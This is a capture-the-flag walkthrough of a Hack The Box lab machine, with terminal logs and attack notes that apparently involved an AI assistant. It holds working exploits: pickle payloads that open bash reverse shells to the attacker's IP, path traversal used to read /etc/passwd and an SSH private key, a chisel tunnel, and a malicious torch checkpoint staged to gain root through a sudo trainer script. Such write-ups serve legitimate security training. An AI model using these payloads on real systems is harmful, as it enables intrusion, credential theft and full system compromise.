# Bedside

sudo nmap -sCV 10.129.248.191
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-11-06 14:01 EST
Nmap scan report for 10.129.248.191
Host is up (0.013s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.68
|_http-title: Did not follow redirect to [http://bedside.htb/](http://bedside.htb/)
|_http-server-header: Apache/2.4.68 (Debian)
3000/tcp filtered ppp
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```jsx
cat /etc/hosts
127.0.0.1	localhost

# The following lines are desirable for IPv6 capable hosts
::1	localhost	ip6-localhost	ip6-loopback
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
127.0.1.1	pwnbox7.1
127.0.1.1	htb-ajkcd0vyjs.htb-cloud.com	htb-ajkcd0vyjs

127.0.0.1 localhost
127.0.1.1 htb-ajkcd0vyjs htb-ajkcd0vyjs.htb-cloud.com
10.129.248.191 bedside.htb
```

```jsx
# gobuster vhost -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil.txt -u http://bedside.htb --append-domain -t 200 --exclude-length 340-380

# Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

# [+] Url: http://bedside.htb
[+] Method: GET
[+] Threads: 200
[+] Wordlist: /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil.txt
[+] User Agent: gobuster/3.6
[+] Timeout: 10s
[+] Append Domain: true
[+] Exclude Length: 340,358,375,353,359,370,365,343,344,350,351,354,360,368,345,355,356,357,372,373,376,377,352,341,342,348,362,367,369,371,374,378,361,366,346,347,380,349,363,364,379

# Starting gobuster in VHOST enumeration mode

Found: research.bedside.htb Status: 200 [Size: 3152]

tail /etc/hosts -n1
10.129.248.191 bedside.htb research.bedside.htb
```

![image.png](Bedside/image.png)

![image.png](Bedside/image%201.png)

# HTB Bedside — Engagement Context

*Target: 10.129.248.191 (bedside.htb) — authorized HTB practice boxLast updated: 2026-11-06Attacker VPN IP (tun0): 10.10.14.80*

## Hosts / vhosts

- `bedside.htb` 10.129.248.191
- `research.bedside.htb` (vhost, found via gobuster vhost; size 3152)
- `/etc/hosts`: `10.129.248.191 bedside.htb research.bedside.htb`

## Ports (nmap -sCV)

| Port | State | Service |
| --- | --- | --- |
| 22/tcp | open | OpenSSH 10.0p2 Debian 7+deb13u4 |
| 80/tcp | open | Apache httpd 2.4.68 (redirects to [http://bedside.htb/](http://bedside.htb/)) |
| 3000/tcp | filtered | ppp — **internal service, SSRF/pivot target once inside** |

## research.bedside.htb — file upload portal

- Medical/AI research theme; upload form field name: `ploadFile` (multipart POST to `/`).
- Response header on every page: **`X-Powered-By: pdfminer.six`** → backend is **Python**, parses PDFs.
- Notice text: accepted formats + "Collections can be uploaded as archives" + "Certain file
formats may be converted to standardized formats before being used for AI training."

### Upload endpoint behavior (empirically mapped)

- **Extension allowlist:** `jpeg jpg png bmp tiff dcm pdf gz zip` (`.txt`/`.php` → "Invalid file type").
- **Content MIME validation:** magic-byte check; invalid content → `"MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads"`. Files must be *genuinely valid*
of their type → payloads must be **polyglots / real files**, not fake-extension shells.
- **Filename sanitized to basename** — `../x.png` stored as `x.png`. No filename path traversal.
- **Storage:** byte-identical, basename, publicly served by Apache at `http://research.bedside.htb/uploads/<name>`.
    - Directory listing `/uploads/` → 403 (no autoindex), but files fetchable by exact name.
- **Leaked absolute path:** `/var/www/research.bedside.htb/uploads`
- **No synchronous conversion or archive extraction** at upload time (verified: images stored as-is,
zip members never appear).
- PHP would not execute anyway (Python app).

## Working hypothesis

The "conversion / AI training" is an **out-of-band background worker** (likely cron) that parses
uploaded files. That parsing step is the real vuln. Leading candidates:

1. **XXE via PDF/image metadata** (pdfminer banner + filtered :3000) → SSRF to 127.0.0.1:3000 + file-read exfil.
2. **Converter delegate RCE** — if images/PDF are standardized via ImageMagick→Ghostscript.
3. **Archive path traversal (zip/tar slip)** by the worker → arbitrary file write (worker user's
`~/.ssh/authorized_keys` or cron).
4. **DICOM (.dcm) parser** bug.

## Attacker infrastructure running

- OOB HTTP listener + malicious DTD on **10.10.14.80:8000** (logs callbacks to `scratchpad/oob/hits.log`).
    - Verified reachable (bound 0.0.0.0:8000, local firewall open) → a real callback WILL register.
- Reverse-shell catcher being set up on **10.10.14.80:443** (FIFO-driven, in `scratchpad/shell/`).

## Blind probes already uploaded (unique callback path each)

| File | Vector | Callback path |
| --- | --- | --- |
| p1_pdf_xmp_direct.pdf | PDF /Metadata XMP external entity | `/pdf-xmp-direct` |
| p2_pdf_xmp_dtd.pdf | PDF XMP external-DTD param entity (exfil /etc/hostname) | `/evil.dtd` → `/EXFIL` |
| p3_img_xmp.jpg | JPEG APP1/XMP XXE | `/img-xmp` |
| p4_collection.zip | zip containing XXE PDF (tests extract+parse) | `/zip-pdf-xmp` |
| p5_zipslip.zip | zip-slip `../` marker write | (poll /uploads for markers) |

Observation set (valid typed files) to reveal which formats the worker converts/extracts:
`obsv_tiff_m1.tiff`, `obsv_bmp_m1.bmp`, `obsv_coll_m1.zip` (memberA/B_m1.png), `obsv_coll_m1.tar.gz`.

## Status / next steps

- As of last check: **no OOB callback, no derived artifacts** → worker hasn't run yet (or cron interval long).
- Two background watchers running (~22 min windows): OOB callbacks, and `/uploads` output artifacts.
- On signal:
    - XXE callback → pivot SSRF to :3000 + file-read exfil via DTD channel.
    - Artifact/extraction → identify exact tool → Ghostscript/ImageMagick delegate RCE or zip/tar-slip write.
    - Reverse shell payload → callback to 10.10.14.80:443.

## Scratchpad locations

- `/tmp/claude-1002/-home-ronking37/b2b2767d-baea-469a-9609-4732859a41eb/scratchpad/` — payloads ([gen.py](http://gen.py/))
- `.../scratchpad/oob/` — listener ([log.py](http://log.py/)), evil.dtd, hits.log
- `.../scratchpad/shell/` — reverse shell FIFO (in.pipe) + out.log

Headers contain pdfminer.six

git clone [https://github.com/saadhassan77/CVE-2025-64512---pdfminer.six-Remote-Code-Execution-RCE-.git](https://github.com/saadhassan77/CVE-2025-64512---pdfminer.six-Remote-Code-Execution-RCE-.git)

```jsx
cat generate_pickle.py 
import pickle, gzip

class EvilPayload:
    def __reduce__(self):
        code = "__import__('os').system('bash -c \"bash -i >& /dev/tcp/10.10.14.80/4444 0>&1\"')"
        return (eval, (code,))

with gzip.open("malicious.pickle.gz", "wb") as f:
    pickle.dump(EvilPayload(), f)
```

```jsx
python3 generate_pickle.py
┌─[us-dedivip-4]─[10.10.14.80]─[ronking37@htb-bgjeb9escd]─[~/CVE-2025-64512---pdfminer.six-Remote-Code-Execution-RCE-]
└──╼ [★]$ ls
exploit_cmap2.pdf  generate_pickle.py  malicious.pickle.gz  method1_encoding_poc.py  method2_cmap_poc.py  README.md
```

```jsx
python3 method1_encoding_poc.py
[+] Generated malicious.pickle.gz and exploit.pdf
[+] Upload both files to the target server
```

upload the files and navigate to them 

```jsx
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.248.191 48950
bash: initialize_job_control: no job control in background: Bad file descriptor
datawrangler@data-wrangler:/app$ id 
id 
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
datawrangler@data-wrangler:/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
datawrangler@data-wrangler:/app$ ^Z
[1]+  Stopped                 nc -lvnp 4444
┌─[us-dedivip-4]─[10.10.14.80]─[ronking37@htb-bgjeb9escd]─[~]
└──╼ [★]$ stty raw -echo;fg
nc -lvnp 4444

datawrangler@data-wrangler:/app$ export TERM=xterm

```

```jsx
curl -s http://localhost:3000/ -o /tmp/bs_index.html
┌─[us-dedivip-4]─[10.10.14.80]─[ronking37@htb-bgjeb9escd]─[~]
└──╼ [★]$ cat /tmp/bs_index.html 
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Bedside Clinic - Image Viewer</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f4f9fc;
      color: #0b3d91;
      margin: 0;
      padding: 20px;
    }

    h1 {
      text-align: center;
      color: #0b3d91;
    }

    #root {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .viewer {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }

    .mask-grid {
      display: grid;
      grid-template-columns: repeat(5, 40px);
      gap: 2px;
      margin-top: 10px;
    }

    .cell {
      width: 40px;
      height: 40px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: bold;
      border-radius: 4px;
      color: #ffffff;
    }

    .cell-0 { background-color: #a0c4ff; }
    .cell-1 { background-color: #0077b6; }

    .controls {
      margin-top: 15px;
      display: flex;
      gap: 10px;
      align-items: center;
    }

    .controls button {
      padding: 6px 12px;
      font-size: 14px;
      border-radius: 4px;
      border: none;
      background-color: #0b3d91;
      color: white;
      cursor: pointer;
    }

    .controls button:disabled {
      background-color: #a0c4ff;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <h1>Bedside Clinic - Image Viewer</h1>
  <div id="root"></div>

  <script type="module">
  	import React from './vendor/react.js';
  	import ReactDOM from './vendor/react-dom.js';
  	import _ from './vendor/lodash.js';

    // Simulate fetching multi-slice MRI + mask data
    async function fetchSlices() {
      // For demo: generate 5 slices with random masks
      const slices = [];
      for (let i = 0; i < 5; i++) {
        const mask = Array.from({ length: 5 }, () =>
          Array.from({ length: 5 }, () => Math.round(Math.random()))
        );
        slices.push({ id: `slice_${i+1}`, mask });
      }
      return slices;
    }

    function MaskGrid({ mask }) {
      return (
        <div className="mask-grid">
          {mask.flat().map((cell, idx) => (
            <div key={idx} className={`cell cell-${cell}`}>{cell}</div>
          ))}
        </div>
      );
    }

    function Viewer({ slices }) {
      const [currentIndex, setCurrentIndex] = React.useState(0);
      const slice = slices[currentIndex];

      const prevSlice = () => setCurrentIndex(idx => Math.max(0, idx - 1));
      const nextSlice = () => setCurrentIndex(idx => Math.min(slices.length - 1, idx + 1));

      return (
        <div className="viewer">
          <h2>{slice.id}</h2>
          <MaskGrid mask={slice.mask} />
          <div className="controls">
            <button onClick={prevSlice} disabled={currentIndex === 0}>Previous Slice</button>
            <span>Slice {currentIndex + 1} / {slices.length}</span>
            <button onClick={nextSlice} disabled={currentIndex === slices.length - 1}>Next Slice</button>
          </div>
        </div>
      );
    }

    function App() {
      const [slices, setSlices] = React.useState([]);

      React.useEffect(() => {
        fetchSlices().then(setSlices);
      }, []);

      return slices.length > 0 ? <Viewer slices={slices} /> : <p>Loading slices...</p>;
    }

    ReactDOM.render(<App />, document.getElementById('root'));
  </script>
</body>
</html>
<script type="module">import createHotContext from"/@hmr";const hot=createHotContext("/index.html");hot.watch(()=>location.reload());</script><script>console.log("%c💚 Built with esm.sh/x, please uncheck \"Disable cache\" in Network tab for better DX!", "color:green")</script>┌─[us-dedivip-4]─[10.10.14.80]─[ronking37@htb-bgjeb9escd]─[~]
└──╼ [★]$ TRAV=""
for i in $(seq 1 12); do
  TRAV="${TRAV}%2e%2e/"
  curl -s --path-as-is -o /tmp/o -w "depth $i -> %{http_code}\n" \
       "http://localhost:3000/${TRAV}etc/passwd"
  if grep -q 'root:x:' /tmp/o 2>/dev/null; then echo "[+] hit at depth $i:"; cat /tmp/o; break; fi
done
depth 1 -> 404
depth 2 -> 404
depth 3 -> 404
depth 4 -> 200
[+] hit at depth 4:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```

CVE-2026-102657 — [esm.sh](http://esm.sh/) static file handler path traversal

chisel server --reverse
2026/11/07 14:23:54 server: Reverse tunnelling enabled
2026/11/07 14:23:54 server: Fingerprint QhpOatJXqX+zjJKr0FMxrX6it31eoDwF1o0jVM6oD2I=
2026/11/07 14:23:54 server: Listening on [http://0.0.0.0:8080](http://0.0.0.0:8080/)
2026/11/07 14:25:01 server: session#1: tun: proxy#R:3000=>3000: Listening

datawrangler@data-wrangler:~$ ./chisel client 10.10.14.80:8080 R:3000:127.0.0.1:3000
2026/11/07 19:24:30 client: Connecting to ws://10.10.14.80:8080
2026/11/07 19:24:30 client: Connected (Latency 7.292317ms)

```jsx
 curl -s --path-as-is "${B}home/developer/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
curl -s --path-as-is "${B}home/developer/.ssh/id_rsa" > key.txt
chmod 600 key.txt
ssh developer@bedside.htb -i key.txt
developer@bedside:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
developer@bedside:~$ whoami
developer
developer@bedside:~$ ls -la
total 36
drwx------ 5 developer developer 4096 Jul 13 14:00 .
drwxr-xr-x 3 root      root      4096 Jul 13 14:00 ..
lrwxrwxrwx 1 root      root         9 Jul 13 12:02 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Nov  9  2025 .bash_logout
-rw-r--r-- 1 developer developer 3526 Nov  9  2025 .bashrc
drwxrwxr-x 3 developer developer 4096 Jul 13 14:00 .local
-rw-r--r-- 1 developer developer  807 Nov  9  2025 .profile
drwxrwxr-x 3 developer developer 4096 Jul 13 14:00 projects
drwxrwxr-x 2 developer developer 4096 Jul 13 14:00 .ssh
-rw-r----- 1 root      developer   33 Nov  6 18:53 user.txt
developer@bedside:~$ cat user.txt
ade8a45b82a7c0233bf743226dce1b55

developer@bedside:/opt/trainer$ sudo -l
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
developer@bedside:/opt/trainer$ cat bedside_trainer.py 
#!/usr/bin/env python3
"""
Bedside Clinic - MONAI trainer (v0.1.0-beta)

This software is an internal beta release intended for use by company staff and developers
for testing, experimentation, and development purposes only.

Key points:

- Staff must **exercise caution** and ensure proper backups of any data used with this tool.
- This tool should **not be used for clinical decision-making** or in patient care.
- Further development, testing, and validation are required before any production deployment.

Usage:
    python bedside_trainer.py [--epochs N] [--batch-size N] [--lr LR] [--scanner /dev/usbscanner0]

Notes:
- Root access is required if specifying a hardware scanner.
- RAW_DIR is currently a placeholder for future integration. Preprocessing features will be added in the future to handle more complex files (DICOM, NIfTI, etc.)
- Current data flow is as follows: [staging/] > [processed/] > (DataLoader) > model
- Script is currently fully functional with image files (jpeg, png, etc.). Refer to allowed extensions for supported types. 

"""

import os
import sys
import shutil
import argparse
from pathlib import Path
from datetime import datetime
import logging
import warnings
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.tensorboard import SummaryWriter
from torch.utils.data import DataLoader

# MONAI imports
warnings.filterwarnings("ignore", category=FutureWarning)
from monai.data import Dataset, CacheDataset
from monai.transforms import (
    Compose, LoadImaged, EnsureChannelFirstd, ScaleIntensityd,
    RandSpatialCropd, ToTensord, EnsureTyped, ResizeWithPadOrCropd
)
from monai.handlers import CheckpointLoader  # <-- Correct import

# --------------------------
# Datastore paths
# --------------------------
DATASTORE_ROOT = Path("/datastore")
CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
LOGS_DIR = DATASTORE_ROOT / "logs"
MODELS_DIR = DATASTORE_ROOT / "models"
PROCESSED_DIR = DATASTORE_ROOT / "processed"
RAW_DIR = DATASTORE_ROOT / "raw"
STAGING_DIR = DATASTORE_ROOT / "staging"

for d in (CHECKPOINT_DIR, LOGS_DIR, MODELS_DIR, PROCESSED_DIR, RAW_DIR, STAGING_DIR):
    d.mkdir(parents=True, exist_ok=True)

# --------------------------
# Logging setup
# --------------------------
log_file = LOGS_DIR / f"training_{datetime.now().strftime('%Y%m%d-%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# --------------------------
# File types
# --------------------------
ALLOWED_EXTS = {
    "jpeg", "jpg", "png", "bmp", "tiff", "tif",
    "gif", "dcm", "ima", "mhd", "raw", "nrrd",
    "nii", "gz", "hdr", "img", "zip", "tar", "tar.gz", "7z",
    "pdf", "txt", "npy"
}

# --------------------------
# Device
# --------------------------
DEVICE = torch.device("cuda" if torch.cuda.is_available() else "cpu")

# --------------------------
# Utility functions
# --------------------------
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None

def is_nifti(p: Path):
    return p.suffix in (".nii", ".gz") and (p.name.endswith(".nii") or p.name.endswith(".nii.gz"))

def collect_processed_files(processed_dir: Path, limit=None):
    files = [p for p in processed_dir.glob("**/*") if p.is_file() and p.suffix.lower().lstrip(".") in ALLOWED_EXTS]
    if limit:
        files = files[:limit]
    return [{"image": str(p)} for p in files]

def conservative_promote_from_staging(staging_dir: Path, processed_dir: Path, max_files=100):
    promoted = 0
    for p in sorted(staging_dir.iterdir()):
        if promoted >= max_files:
            break
        if not p.is_file():
            continue
        ext = p.suffix.lower().lstrip(".")
        if ext in ALLOWED_EXTS:
            dest = processed_dir / p.name
            try:
                shutil.move(str(p), str(dest))
                promoted += 1
            except Exception as e:
                logger.warning(f"Failed to promote {p}: {e}")
    return promoted

def prepare_dataloader_from_processed(processed_dir: Path, batch_size: int):
    data = collect_processed_files(processed_dir)
    if not data:
        return None, 0

    contains_nifti = any(is_nifti(Path(d["image"])) for d in data)

    if contains_nifti:
        transforms = Compose([
            LoadImaged(keys=["image"]),
            EnsureChannelFirstd(keys=["image"]),
            ScaleIntensityd(keys=["image"]),
            RandSpatialCropd(keys=["image"], roi_size=(64,64,64), random_size=False),
            EnsureTyped(keys=["image"])
        ])
        dataset = CacheDataset(data=data, transform=transforms, cache_rate=1.0, num_workers=1)
    else:
        transforms = Compose([
            LoadImaged(keys=["image"]),
            EnsureChannelFirstd(keys=["image"]),
            ScaleIntensityd(keys=["image"]),
            ResizeWithPadOrCropd(keys=["image"], spatial_size=(64,64)),
            ToTensord(keys=["image"]),
            EnsureTyped(keys=["image"])
        ])
        dataset = Dataset(data=data, transform=transforms)

    dataloader = DataLoader(dataset, batch_size=batch_size, shuffle=True, num_workers=1)
    return dataloader, len(data)

def build_model(dataloader=None, hidden_dim=128):
    if dataloader is None:
        raise ValueError("Dataloader must be provided to infer input size.")
    sample_batch = next(iter(dataloader))["image"].to(torch.device("cpu"))
    n_features = sample_batch.numel() // sample_batch.shape[0]
    logger.info(f"Auto-detected input features: {n_features}")
    model = nn.Sequential(
        nn.Flatten(),
        nn.Linear(n_features, hidden_dim),
        nn.ReLU(),
        nn.Linear(hidden_dim, 1)
    )
    return model

# --------------------------
# Main
# --------------------------
def main():
    parser = argparse.ArgumentParser(description="MONAI trainer with datastore integration")
    parser.add_argument("--epochs", "-e", type=int, default=50, help="Number of training epochs")
    parser.add_argument("--batch-size", "-b", type=int, default=4, help="Batch size")
    parser.add_argument("--lr", type=float, default=1e-3, help="Learning rate")
    parser.add_argument("--scanner", type=str, default=None, help="Hardware scanner device (requires root)")
    args = parser.parse_args()

    if args.scanner and os.geteuid() != 0:
        logger.error("Root access required to use a hardware scanner. Exiting.")
        sys.exit(1)

    NUM_EPOCHS = args.epochs
    BATCH_SIZE = args.batch_size
    LEARNING_RATE = args.lr
    SAVE_INTERVAL = 5

    logger.info(f"Device: {DEVICE}")

    dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
    if n_data == 0:
        promoted = conservative_promote_from_staging(STAGING_DIR, PROCESSED_DIR, max_files=200)
        if promoted:
            logger.info(f"Promoted {promoted} files from staging -> processed")
            dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
        else:
            logger.warning("No data available to train. Exiting.")
            return

    logger.info(f"Using {n_data} samples for training.")

    model = build_model(dataloader).to(DEVICE)
    optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE)
    loss_fn = nn.MSELoss()

    # --------------------------
    # Checkpoint loading (MONAI-compatible callable form)
    # --------------------------
    latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
    start_epoch = 0
    if latest_ckpt:
        logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...")
        loader = CheckpointLoader(
            load_path=str(latest_ckpt),
            load_dict={"model": model, "optimizer": optimizer},
            map_location=DEVICE
        )

        # Minimal mock engine for MONAI handler compatibility
        class MockEngine:
            def __init__(self):
                self.state = type("State", (), {})()
                self.state.max_epochs = None
                self.state.epoch = 0

        engine = MockEngine()
        loader(engine)  # invoke the handler directly

        # Retrieve saved epoch if available
        if hasattr(engine.state, "epoch") and engine.state.epoch:
            start_epoch = engine.state.epoch
        elif hasattr(loader, "loaded_objects") and "epoch" in loader.loaded_objects:
            start_epoch = loader.loaded_objects["epoch"]

        logger.info(f"Resuming from epoch {start_epoch}")

    writer = SummaryWriter(log_dir=str(LOGS_DIR / datetime.now().strftime("%Y%m%d-%H%M%S")))

    # Training loop
    for epoch in range(start_epoch, NUM_EPOCHS):
        model.train()
        epoch_loss = 0.0
        for batch in dataloader:
            imgs = batch["image"].to(DEVICE)
            target = torch.zeros((imgs.shape[0], 1), device=DEVICE)

            optimizer.zero_grad()
            out = model(imgs)
            loss = loss_fn(out, target)
            loss.backward()
            optimizer.step()
            epoch_loss += float(loss.item())

        avg_loss = epoch_loss / max(1, len(dataloader))
        logger.info(f"[EPOCH {epoch+1}/{NUM_EPOCHS}] avg_loss: {avg_loss:.6f}")

        if (epoch + 1) % SAVE_INTERVAL == 0 or (epoch + 1) == NUM_EPOCHS:
            ckpt_payload = {
                "epoch": epoch + 1,
                "model": model.state_dict(),
                "optimizer": optimizer.state_dict()
            }
            ckpt_name = CHECKPOINT_DIR / f"checkpoint_epoch_{epoch+1}.pt"
            torch.save(ckpt_payload, ckpt_name)
            logger.info(f"Saved checkpoint: {ckpt_name}")

    # Save final model
    final_model_file = MODELS_DIR / f"final_model_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pt"
    torch.save({"model": model.state_dict()}, final_model_file)
    logger.info(f"Saved final model: {final_model_file}")
    logger.info("Training completed.")
    writer.close()

if __name__ == "__main__":
    main()

```

# HTB Bedside — Progress & Context

*Last updated: 2026-11-07*

## Current position

- **Foothold:** RCE as `datawrangler` in the **`data-wrangler` Docker container** via **CVE-2025-64512** (pdfminer.six 20250506, PDF uploaded to the web app → `/app/pdf_watcher.py` ran `pdf2txt.py`).
- **Escaped container → host as `developer`** via [esm.sh](http://esm.sh/) path traversal (below). Have SSH as `developer`.
- **Next / final step:** `developer → root` via a NOPASSWD sudo trainer that `torch.load()`s an attacker-controlled checkpoint. **Exploit is staged and ready — just run it (Step 5).**

## Access I currently hold

- **Container shell** as `datawrangler` (uid **988**, gid `dataops`=**1001**). Owns `/datastore/*` (host-backed bind mount, `/dev/sda4`). This is the ONLY way to write `/datastore` (perms `drwxrwx--- 988:1001`, `developer` has no access).
- **Host shell / SSH** as `developer` (uid **1000**, groups developer,users). Can run the sudo trainer as root. Cannot touch `/datastore`.
- Attacker box: tun0 = **10.10.14.80**. Target web = port 80; SSH = port 22 open.

## Box architecture

- `data-wrangler` container: hardened `docker-default` (seccomp on, AppArmor enforce, **no dangerous caps**, no docker sock). Standard breakouts all dead.
- Shared host-backed mounts into container: `/datastore` (rw) and `/var/www/research.bedside.htb/uploads` (rw).
- Container shares the **host network namespace** → host loopback services reachable from container.
- Host loopback/other services seen: `127.0.0.1:38461` (Go `net/http`, unexplored), `:80` web, `:22` ssh, `:3000` [esm.sh](http://esm.sh/) dev server.

## How I escaped the container (datawrangler → developer)

- `:3000` = [**esm.sh/x](http://esm.sh/x) dev server** ("Bedside Clinic - Image Viewer"; `/@hmr`, "Built with [esm.sh/x](http://esm.sh/x)"). The React mask-viewer is a static demo (random masks) — NOT an inference backend.
- Vulnerable to [esm.sh](http://esm.sh/) **path traversal / arbitrary file read** (CVE-2026-102657 / CVE-2025-59341). Encoded `%2e%2e` segments bypass Go ServeMux; use `curl --path-as-is`.
- Read `/home/developer/.ssh/` private key via traversal → `ssh developer@<target>`.
- (Port-forwarded 3000 locally with chisel during this stage.)

## ROOT exploit — staged, ready to fire (developer → root)

**Target:** `/opt/trainer/bedside_trainer.py` (owned root:root; I can't edit it).
**Sudo:** `(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py`  ← run **bare**, no extra args (sudoers arg list is fixed).
**Bug:** trainer calls `find_latest_checkpoint()` (newest `*.pt` by mtime in `/datastore/checkpoints`) → MONAI `CheckpointLoader` → `torch.load()` → **unpickles** → RCE as root.
**Gotchas:**

- `torch.load` rejects a bare `pickle.dumps` file → must build with **`torch.save`** (torch container format).
- Checkpoint load only reached if `build_model` succeeds, i.e. `processed/` must contain **only valid images** (no `.txt`, or `LoadImaged` throws first).
- Verify not blocked by `weights_only=True` (torch ≥2.6). Check: `python3 -c "import torch,monai;print(torch.__version__,monai.__version__)"`. If blocked, switch to a weights_only-safe gadget.

### Step 1 — build payload (host, as developer)

```bash
python3 - <<'EOF'
import torch, os
cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.80/4445 0>&1'"
class E:
    def __reduce__(self): return (os.system, (cmd,))
torch.save(E(), "/tmp/zzz_evil.pt")
EOF
echo "---CKPT---"; base64 -w0 /tmp/zzz_evil.pt; echo
```

### Step 2 — stage in /datastore (CONTAINER shell, uid 988)

```bash
echo '<paste-CKPT-base64>' | base64 -d > /datastore/checkpoints/zzz_evil.pt
rm -f /datastore/checkpoints/zzz_latest.pt
rm -rf /datastore/processed/*
PNG='iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAHklEQVR42u3BAQ0AAADCoPdPbQ8HFAAAAAAAAAAAAwY0AAEB2O9bAAAAAElFTkSuQmCC'
for i in 1 2 3 4; do echo "$PNG" | base64 -d > /datastore/processed/img_$i.png; done
ls -lat /datastore/checkpoints/   # zzz_evil.pt must be NEWEST
```

### Step 3 — fire (host, as developer)

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
/tmp/rootbash -p; id; cat /root/root.txt
```

Reverse-shell variant: `cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.80/4444 0>&1'"` (listener first; os.system blocks until shell exits — fine).

## Open threads / if root path fails

- `127.0.0.1:38461` Go service never enumerated — fallback vector.
- The stale `developer@bedside` pickle that was pre-planted in `/datastore/checkpoints` was another player's (not mine) — ignore/overwrite.
- SECRETMARKER found earlier in `/datastore/staging/ffc4ce80-2e27-4e29-96b9-e581c306891b.txt` (flag/marker from the staging enum).

## CVE references

- CVE-2025-64512 — pdfminer.six (initial container RCE)
- CVE-2026-102657 / CVE-2025-59341 — [esm.sh](http://esm.sh/) path traversal (container escape to developer)
- Checkpoint/pickle RCE via MONAI CheckpointLoader `torch.load` (developer → root)

developer@bedside:/$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
2026-11-09 02:32:30,032 | INFO | Device: cpu
2026-11-09 02:32:30,035 | INFO | Using 4 samples for training.
2026-11-09 02:32:30,230 | INFO | Auto-detected input features: 4096
2026-11-09 02:32:30,244 | INFO | Found checkpoint /datastore/checkpoints/zzz_evil.pt, loading with CheckpointLoader (callable mode)...

^C

```jsx
